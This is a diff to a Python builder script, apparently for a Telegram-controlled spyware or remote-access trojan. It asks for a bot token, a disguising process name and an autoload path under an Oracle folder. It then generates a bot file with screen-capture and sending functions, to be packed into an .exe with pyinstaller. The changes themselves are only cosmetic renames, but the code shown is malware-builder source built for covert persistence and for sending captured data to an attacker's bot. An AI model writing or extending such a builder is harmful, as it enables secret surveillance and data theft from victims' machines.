@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*- 
 import colorama
 import random
 
@@ -50,7 +51,7 @@ def main():
 	
 	print(random.choice(banners))
 	print("Version 0.1(beta)")
-	token=str(input("Telegram bot api token: "))
+	tk=str(input("Telegram bot api token: "))
 	proc=str(input("Process name (no file extension): "))
 	#print("Admin id :");admin=int(input())
 	auto=str(input("Path to autoload (C:\\Program Files\\Oracle\\ ) :"))
@@ -96,7 +97,7 @@ def screen():
 
 
 def otpravka():
-	bot = telebot.TeleBot('"""+str(token)+"""')
+	bot = telebot.TeleBot('"""+str(tk)+"""')
 
 	# Тут работаем с командой start
 	@bot.message_handler(commands=['start'])
@@ -139,6 +140,6 @@ if __name__ == '__main__':
 	f.close()
 	print('DONE')
 	print("Use pyinstaller for make .exe file ")
-	print('file name bot file is',py)
+	print('bot file is',py)
 if __name__ == '__main__':
 	main()
